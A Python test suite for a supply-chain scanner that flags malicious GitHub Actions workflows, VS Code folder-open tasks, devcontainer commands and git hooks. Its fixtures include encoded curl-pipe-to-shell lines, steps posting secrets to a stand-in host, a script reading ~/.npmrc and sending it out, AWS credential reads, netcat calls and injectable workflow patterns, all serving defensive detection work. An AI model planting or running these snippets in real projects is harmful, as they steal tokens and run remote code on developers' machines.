"""Workflows, editor tasks, dev containers and git hooks, and what they run.

Cases are modelled on the incidents in the roadmap: GhostAction workflows that post
secrets, ChainDrop and PolinRider VS Code folder-open tasks, plus pull-request trust
boundary cases from GitHub's own guidance, and negatives for each. Shell that antivirus
products flag is ROT13-encoded and decoded in memory; assertions compare rule IDs, lines
and paths.
"""

from __future__ import annotations

import codecs
import json
from pathlib import Path
from textwrap import dedent

from bombsquad.model import Level
from bombsquad.repo import jsonc
from bombsquad.repo import yamltree as y
from bombsquad.scan import scan
from bombsquad.textpos import Positions

ROOT = Path(__file__).resolve().parent.parent
PIPE_TO_SHELL = "phey -fFY uggcf://rknzcyr.vainyvq/v | fu"
POST_TOKEN = 'phey -f -q "CLCV_NCV_GBXRA=${{ frpergf.CLCV_NCV_GBXRA }}" uggcf://rknzcyr.vainyvq/pbyyrpg'
POST_ALL = 'phey -K CBFG --qngn "${{ gbWFBA(frpergf) }}" uggcf://rknzcyr.vainyvq'


def rot(text: str) -> str:
    return codecs.decode(text, "rot13")


def build(root: Path, files: dict[str, str], newline: str = "\n") -> Path:
    for name, text in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline=newline)
    return root


def workflow(text: str, name: str = "ci.yml") -> dict[str, str]:
    return {f".github/workflows/{name}": dedent(text).lstrip()}


def found(report, rule_id: str) -> list:
    return [f for f in report.findings if f.rule.id == rule_id]


def ids(report, suffix: str = "") -> set[str]:
    return {f.rule.id for f in report.findings if f.path.endswith(suffix)}


# GitHub Actions: secrets sent out (GhostAction) ------------------------------------------

def test_step_that_posts_a_secret_is_high_at_its_line(tmp_path):
    root = build(tmp_path, workflow("""
        name: release
        on: push
        permissions:
          contents: read
        jobs:
          publish:
            runs-on: ubuntu-latest
            steps:
              - name: Upload
                run: |
                  echo start
                  STEP
        """.replace("STEP", rot(POST_TOKEN))))
    report = scan([root])
    [entry] = report.entry_points
    assert entry.kind == "workflow job publish" and entry.surface == "github-actions"
    [sent] = found(report, "BS-GHA-006")
    assert sent.level is Level.HIGH and sent.region.line == 12
    assert any("request body" in step for step in sent.via)
    assert any("${{ " in e for e in [sent.evidence])  # the expression, not a placeholder
    assert ids(report) == {"BS-GHA-006", "BS-NET-003", "BS-CR-001"}  # CR: the token's name
    assert {f.region.line for f in report.findings} == {12}
    assert found(report, "BS-EX-001") == []  # BS-GHA-006 covers workflows


def test_step_that_posts_every_secret_through_env(tmp_path):
    step = rot(POST_ALL).replace("${{ toJSON(secrets) }}", "$ALL")
    root = build(tmp_path, workflow("""
        on: [push, workflow_dispatch]
        permissions: {}
        env:
          ALL: ${{ toJSON(secrets) }}
        jobs:
          sync:
            runs-on: ubuntu-latest
            steps:
              - run: STEP
        """.replace("STEP", step)))
    [sent] = found(scan([root]), "BS-GHA-006")
    assert sent.level is Level.HIGH and sent.region.line == 9
    assert any("every secret" in step for step in sent.via)


def test_secret_in_an_authorization_header_is_only_review(tmp_path):
    root = build(tmp_path, workflow("""
        on: push
        permissions: {}
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  curl -fsS -H "Authorization: Bearer ${{ secrets.DEPLOY_TOKEN }}" \\
                    https://deploy.example.invalid/hook
              - env:
                  HOOK: ${{ secrets.SLACK_WEBHOOK }}
                run: curl -X POST -d '{"text":"done"}' "$HOOK"
        """))
    report = scan([root])
    assert [f.level for f in found(report, "BS-GHA-006")] == [Level.REVIEW, Level.REVIEW]


def test_secrets_without_network_are_quiet(tmp_path):
    root = build(tmp_path, workflow("""
        on: push
        permissions: {}
        jobs:
          publish:
            runs-on: ubuntu-latest
            steps:
              - run: npm publish
                env:
                  NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        """))
    report = scan([root])
    assert report.findings == []
    assert len(report.entry_points) == 1


# GitHub Actions: pull-request trust boundary ---------------------------------------------

def test_pull_request_target_checking_out_the_head_is_high(tmp_path):
    root = build(tmp_path, workflow("""
        on: pull_request_target
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - run: npm install && npm test
        """))
    report = scan([root])
    [checkout] = found(report, "BS-GHA-001")
    assert checkout.level is Level.HIGH and checkout.region.line == 10
    assert ids(report) == {"BS-GHA-001"}


def test_pull_request_target_on_the_base_branch_is_quiet(tmp_path):
    root = build(tmp_path, workflow("""
        on: pull_request_target
        permissions:
          pull-requests: write
        jobs:
          label:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - run: echo "PR ${{ github.event.pull_request.number }}"
        """))
    assert scan([root]).findings == []


def test_workflow_run_fetching_the_branch_by_name(tmp_path):
    root = build(tmp_path, workflow("""
        on:
          workflow_run:
            workflows: [CI]
            types: [completed]
        permissions:
          contents: read
        jobs:
          report:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  git fetch origin ${{ github.event.workflow_run.head_branch }}
                  git checkout FETCH_HEAD
        """))
    report = scan([root])
    assert ids(report) == {"BS-GHA-001", "BS-GHA-002"}
    assert {f.region.line for f in report.findings} == {12}


# GitHub Actions: script injection --------------------------------------------------------

def test_issue_title_in_run_is_high_at_the_expression(tmp_path):
    root = build(tmp_path, workflow("""
        on:
          issues:
            types: [opened]
        permissions:
          issues: write
        jobs:
          triage:
            runs-on: ubuntu-latest
            steps:
              - name: Greet
                run: |
                  echo "Thanks for opening this"
                  echo "Title: ${{ github.event.issue.title }}"
        """))
    report = scan([root])
    [injection] = found(report, "BS-GHA-002")
    assert injection.level is Level.HIGH
    assert (injection.region.line, injection.region.column) == (13, 24)


def test_values_passed_through_env_or_safe_fields_are_quiet(tmp_path):
    root = build(tmp_path, workflow("""
        on: issue_comment
        permissions:
          issues: write
        jobs:
          triage:
            runs-on: ubuntu-latest
            steps:
              - env:
                  BODY: ${{ github.event.comment.body }}
                run: |
                  echo "$BODY" | head -c 100
                  echo "#${{ github.event.issue.number }} by ${{ github.event.comment.user.login }}"
                  echo "${{ inputs.name }}"
        """))
    assert scan([root]).findings == []


def test_other_event_fields_are_review(tmp_path):
    root = build(tmp_path, workflow("""
        on: release
        permissions:
          contents: read
        jobs:
          notes:
            runs-on: ubuntu-latest
            steps:
              - run: echo "${{ github.event.release.tag_name }}"
        """))
    [injection] = found(scan([root]), "BS-GHA-002")
    assert injection.level is Level.REVIEW


def test_comment_body_in_github_script_is_high(tmp_path):
    root = build(tmp_path, workflow("""
        on: issue_comment
        permissions:
          issues: write
        jobs:
          reply:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/github-script@v7
                with:
                  script: |
                    const body = `${{ github.event.comment.body }}`;
                    await github.rest.issues.createComment({ ...context.repo, body });
        """))
    report = scan([root])
    assert ids(report) == {"BS-GHA-002"}
    assert found(report, "BS-GHA-002")[0].region.line == 11


# GitHub Actions: permissions, pinning, runners --------------------------------------------

def test_permissions(tmp_path):
    root = build(tmp_path, {
        **workflow("""
            on: push
            permissions: write-all
            jobs:
              a:
                runs-on: ubuntu-latest
                steps: [{run: make}]
            """, "broad.yml"),
        **workflow("""
            on: push
            jobs:
              deploy:
                runs-on: ubuntu-latest
                permissions:
                  id-token: write
                  contents: read
                steps: [{run: make deploy}]
              lint:
                runs-on: ubuntu-latest
                steps: [{run: make lint}]
            """, "deploy.yml"),
    })
    report = scan([root])
    assert ids(report, "broad.yml") == {"BS-GHA-003"}
    assert ids(report, "deploy.yml") == {"BS-GHA-003", "BS-GHA-004"}
    [missing] = [f for f in found(report, "BS-GHA-003") if f.path.endswith("deploy.yml")]
    assert missing.level is Level.INFO and missing.region.line == 2
    assert [missing.evidence] == ["no permissions block for lint"]


def test_third_party_actions_by_tag_and_self_hosted_runners(tmp_path):
    root = build(tmp_path, workflow("""
        on: pull_request
        permissions:
          contents: read
        jobs:
          build:
            runs-on: [self-hosted, linux]
            steps:
              - uses: actions/checkout@v4
              - uses: some-owner/setup-thing@v2
              - uses: some-owner/pinned@0123456789abcdef0123456789abcdef01234567 # v2
              - uses: docker://alpine:3.20
              - uses: ./.github/actions/local
          reuse:
            uses: some-owner/workflows/.github/workflows/build.yml@main
        """))
    report = scan([root])
    assert ids(report) == {"BS-PIN-001", "BS-GHA-005"}
    assert sorted(f.region.line for f in found(report, "BS-PIN-001")) == [9, 11, 14]
    assert found(report, "BS-GHA-005")[0].region.line == 6


def test_this_repository_follows_its_own_rules():
    report = scan([ROOT / ".github"])
    assert {e.kind for e in report.entry_points} == {
        "workflow job test", "workflow job code-scanning", "workflow job actionlint"}
    assert report.findings == []


# GitHub Actions: run steps and the files they run ----------------------------------------

def test_run_steps_are_analysed_in_their_shell(tmp_path):
    root = build(tmp_path, workflow("""
        on: push
        permissions: {}
        jobs:
          linux:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  echo hi
                  STEP
              - shell: python
                run: import socket
          windows:
            runs-on: windows-latest
            steps:
              - run: Remove-Item -Recurse C:\\build
        """.replace("STEP", rot(PIPE_TO_SHELL))))
    report = scan([root])
    assert {(f.rule.id, f.region.line) for f in report.findings} == {
        ("BS-NET-002", 9), ("BS-NET-003", 11), ("BS-FS-001", 15)}


def test_scripts_a_step_runs_are_followed_but_data_files_are_not(tmp_path):
    root = build(tmp_path, {
        **workflow("""
            on: push
            permissions: {}
            jobs:
              release:
                runs-on: ubuntu-latest
                steps:
                  - run: bash ./scripts/release.sh
                  - run: shellcheck scripts/lint-only.sh && cat scripts/lint-only.sh
                  - run: uv run python tools/report.py --out x
            """),
        "scripts/release.sh": rot(PIPE_TO_SHELL) + "\n",
        "scripts/lint-only.sh": rot(PIPE_TO_SHELL) + "\n",
        "tools/report.py": "import urllib.request\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert sorted(t.rsplit("/", 1)[-1] for t in entry.targets) == ["release.sh", "report.py"]
    assert ids(report, "release.sh") == {"BS-NET-002"}
    assert ids(report, "lint-only.sh") == set()
    assert ids(report, "report.py") == {"BS-NET-003"}


def test_crlf_workflow_keeps_exact_lines(tmp_path):
    root = build(tmp_path, workflow("""
        on: issues
        permissions: {}
        jobs:
          a:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  true
                  echo "${{ github.event.issue.body }}"
        """), newline="\r\n")
    [injection] = found(scan([root]), "BS-GHA-002")
    assert (injection.region.line, injection.region.column) == (9, 17)


def test_composite_and_javascript_actions(tmp_path):
    root = build(tmp_path, {
        "setup/action.yml": dedent("""
            name: setup
            runs:
              using: composite
              steps:
                - uses: some-owner/cache@v3
                - shell: bash
                  run: ${{ github.action_path }}/install.sh
            """).lstrip(),
        "setup/install.sh": rot(PIPE_TO_SHELL) + "\n",
        "node-action/action.yml": "name: n\nruns:\n  using: node20\n  main: dist/index.js\n",
        "node-action/dist/index.js": "require('https').get('https://example.invalid')\n",
        "not-an-action/action.yml": "name: just a file\n",
    })
    report = scan([root])
    assert sorted(e.kind for e in report.entry_points) == [
        "JavaScript action (node20)", "composite action"]
    assert ids(report, "setup/action.yml") == {"BS-PIN-001"}
    assert ids(report, "install.sh") == {"BS-NET-002"}
    assert ids(report, "index.js") == {"BS-NET-003"}


def test_unreadable_workflow_is_noted(tmp_path):
    root = build(tmp_path, workflow("on: push\njobs: [unclosed\n"))
    report = scan([root])
    [result] = [r for r in report.files if r.path.endswith("ci.yml")]
    assert any("GitHub may still run it" in note for note in result.notes)
    assert report.entry_points == []


# Editors ---------------------------------------------------------------------------------

def test_folder_open_task_that_steals_npm_token(tmp_path):
    root = build(tmp_path, {
        ".vscode/tasks.json": dedent("""
            // Planted by the worm, modelled on ChainDrop
            {
              "version": "2.0.0",
              "tasks": [
                {
                  "label": "setup",
                  "type": "shell",
                  "command": "node",
                  "args": [".vscode/setup.js"],
                  "runOptions": { "runOn": "folderOpen" }, /* trailing comma next */
                },
              ],
            }
            """).lstrip(),
        ".vscode/setup.js": (
            "const fs = require('fs'), os = require('os');\n"
            "const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
            "require('https').request({ host: 'example.invalid', method: 'POST' }).end(t);\n"
        ),
    })
    report = scan([root])
    [entry] = report.entry_points
    assert entry.kind == "VS Code task 'setup' (runOn: folderOpen)"
    assert ids(report, "tasks.json") == {"BS-EP-002", "BS-EX-001"}
    assert found(report, "BS-EP-002")[0].region.line == 10
    assert ids(report, "setup.js") == {"BS-CR-001", "BS-NET-003"}


def test_folder_open_task_hidden_after_whitespace_and_its_dependency(tmp_path):
    hidden = "echo building" + " " * 160 + "&& " + rot(PIPE_TO_SHELL)
    tasks = {"version": "2.0.0", "tasks": [
        {"label": "build", "type": "shell", "command": hidden},
        {"label": "open", "type": "shell", "command": "echo ready", "dependsOn": ["prep"],
         "runOptions": {"runOn": "folderOpen"}},
        {"label": "prep", "type": "process", "command": "python3",
         "args": ["-c", "import socket"]},
    ]}
    root = build(tmp_path, {".vscode/tasks.json": json.dumps(tasks, indent=2)})
    report = scan([root])
    # "build" does not run on open; whitespace padding is reported in any text file.
    assert ids(report) == {"BS-EP-002", "BS-NET-003", "BS-OB-001"}
    assert [e.kind for e in report.entry_points] == ["VS Code task 'open' (runOn: folderOpen)"]


def test_windows_task_is_powershell(tmp_path):
    tasks = {"version": "2.0.0", "tasks": [{
        "label": "clean", "type": "shell", "command": "make clean",
        "windows": {"command": "Remove-Item -Recurse -Force C:\\x"},
        "runOptions": {"runOn": "folderOpen"}}]}
    root = build(tmp_path, {".vscode/tasks.json": json.dumps(tasks, indent=2)})
    assert ids(scan([root])) == {"BS-EP-002", "BS-FS-001"}


def test_tasks_without_folder_open_are_not_entry_points(tmp_path):
    tasks = {"version": "2.0.0", "tasks": [
        {"label": "deploy", "type": "shell", "command": rot(PIPE_TO_SHELL)}]}
    root = build(tmp_path, {".vscode/tasks.json": json.dumps(tasks)})
    report = scan([root])
    assert report.entry_points == [] and report.findings == []


def test_devcontainer_lifecycle_commands(tmp_path):
    root = build(tmp_path, {
        ".devcontainer/devcontainer.json": dedent("""
            {
              // Runs on the host
              "initializeCommand": ["bash", "-c", "cat ~/.aws/credentials > .env.local"],
              "postCreateCommand": {
                "deps": "npm ci",
                "tools": "PIPE"
              },
              "postStartCommand": "node .devcontainer/start.js"
            }
            """).lstrip().replace("PIPE", rot(PIPE_TO_SHELL)),
        ".devcontainer/start.js": "require('net').connect(80, 'example.invalid')\n",
    })
    report = scan([root])
    assert sorted(e.kind for e in report.entry_points) == [
        "devcontainer initializeCommand", "devcontainer postCreateCommand",
        "devcontainer postStartCommand"]
    assert {(f.rule.id, f.region.line) for f in report.findings
            if f.path.endswith("devcontainer.json")} == {
        ("BS-EP-003", 3), ("BS-CR-001", 3), ("BS-NET-002", 6)}
    assert ids(report, "start.js") == {"BS-NET-003"}


def test_ordinary_devcontainer_is_listed_without_findings(tmp_path):
    root = build(tmp_path, {".devcontainer.json": '{"image": "x", "postCreateCommand": "npm ci"}'})
    report = scan([root])
    assert [e.kind for e in report.entry_points] == ["devcontainer postCreateCommand"]
    assert report.findings == []


# Git hooks -------------------------------------------------------------------------------

def test_husky_hook(tmp_path):
    root = build(tmp_path, {
        ".husky/pre-commit": "npx lint-staged\n" + rot(PIPE_TO_SHELL) + "\n",
        ".husky/_/husky.sh": rot(PIPE_TO_SHELL) + "\n",
        ".husky/notes.txt": "not a hook\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert entry.kind == "husky pre-commit hook" and "git commit" in entry.trigger
    assert {(f.rule.id, f.region.line) for f in report.findings} == {("BS-NET-002", 2)}


def test_lefthook_commands_scripts_and_remotes(tmp_path):
    root = build(tmp_path, {
        "lefthook.yml": dedent("""
            remotes:
              - git_url: https://example.invalid/shared-hooks
                ref: v1.2.0
            pre-commit:
              commands:
                lint:
                  run: npx eslint {staged_files}
                fetch:
                  run: PIPE
            pre-push:
              scripts:
                "check.sh":
                  runner: bash
              jobs:
                - name: group
                  group:
                    jobs:
                      - run: python3 -c "import socket"
            """).lstrip().replace("PIPE", rot(PIPE_TO_SHELL)),
        ".lefthook/pre-push/check.sh": "nc example.invalid 4444\n",
    })
    report = scan([root])
    assert sorted(e.kind for e in report.entry_points) == [
        "lefthook pre-commit hook", "lefthook pre-push hook"]
    assert {(f.rule.id, f.region.line) for f in report.findings
            if f.path.endswith("lefthook.yml")} == {
        ("BS-PIN-001", 2), ("BS-NET-002", 9), ("BS-NET-003", 18)}
    assert ids(report, "check.sh") == {"BS-NET-003"}


def test_pre_commit_local_hooks_and_pinning(tmp_path):
    root = build(tmp_path, {
        ".pre-commit-config.yaml": dedent("""
            repos:
              - repo: https://github.com/some-owner/hooks
                rev: v4.6.0
                hooks: [{id: trailing-whitespace}]
              - repo: https://github.com/some-owner/pinned
                rev: 0123456789abcdef0123456789abcdef01234567  # frozen: v1.0.0
                hooks: [{id: fmt}]
              - repo: meta
                hooks: [{id: check-useless-excludes}]
              - repo: local
                hooks:
                  - id: fetch-tools
                    name: fetch tools
                    entry: PIPE
                    language: system
                  - id: check
                    name: check
                    entry: hooks/check
                    language: script
                  - id: no-todo
                    name: no todo
                    entry: 'curl|wget'
                    language: pygrep
            """).lstrip().replace("PIPE", rot(PIPE_TO_SHELL)),
        "hooks/check": "nc example.invalid 4444\n",
    })
    report = scan([root])
    kinds = sorted(e.kind for e in report.entry_points)
    assert kinds == ["pre-commit hooks from https://github.com/some-owner/hooks",
                     "pre-commit hooks from https://github.com/some-owner/pinned",
                     "pre-commit local hook 'check' (script)",
                     "pre-commit local hook 'fetch-tools' (system)"]
    assert {(f.rule.id, f.region.line) for f in report.findings
            if f.path.endswith(".pre-commit-config.yaml")} == {
        ("BS-PIN-001", 3), ("BS-NET-002", 14)}
    assert ids(report, "hooks/check") == {"BS-NET-003"}


def test_files_outside_the_repository_are_not_followed(tmp_path):
    build(tmp_path, {"outside.sh": "nc example.invalid 1\n",
                     "hooks/pre-commit/x.sh": "nc example.invalid 2\n"})
    root = build(tmp_path / "repo", {
        "act/action.yml": dedent("""
            runs:
              using: composite
              steps:
                - shell: bash
                  run: bash ${{ github.action_path }}/../../outside.sh
            """).lstrip(),
        "lefthook.yml": "source_dir: ../hooks/\npre-commit:\n  scripts:\n    x.sh: {runner: sh}\n",
    })
    report = scan([root])
    assert all(e.targets == [] for e in report.entry_points)
    assert report.findings == []


# Readers ---------------------------------------------------------------------------------

def test_jsonc_reader_keeps_positions():
    text = '{\n  // c\n  "a": [1, "two", {"b": null},], /* x */\n  "a2": true,\n}\n'
    node = jsonc.parse(text)
    assert [n.value for n in node.get("a").items()][:2] == [1, "two"]
    assert text[slice(*node.key_span("a2"))] == '"a2"'
    assert node.get("a2").value is True


def test_jsonc_reader_rejects_deep_nesting():
    try:
        jsonc.parse("[" * 1000)
    except jsonc.JsoncError as exc:
        assert "nested" in str(exc)
    else:
        raise AssertionError("expected an error")


def test_yaml_reader_does_not_construct_objects():
    node = y.compose("a: !!python/object/apply:os.system ['true']\nb: &x [1]\nc: *x\n")
    assert y.get(node, "a").tag == "tag:yaml.org,2002:python/object/apply:os.system"
    assert y.get(node, "b") is y.get(node, "c")


def test_scalar_map_for_literal_blocks():
    text = "run: |\n  one\n\n    two\n"
    node = y.get(y.compose(text), "run")
    scalar = y.ScalarMap.build(Positions(text), node)
    assert scalar.offset() == (1, 2)
    assert scalar.region(node.value.index("two"), node.value.index("two") + 3).line == 4
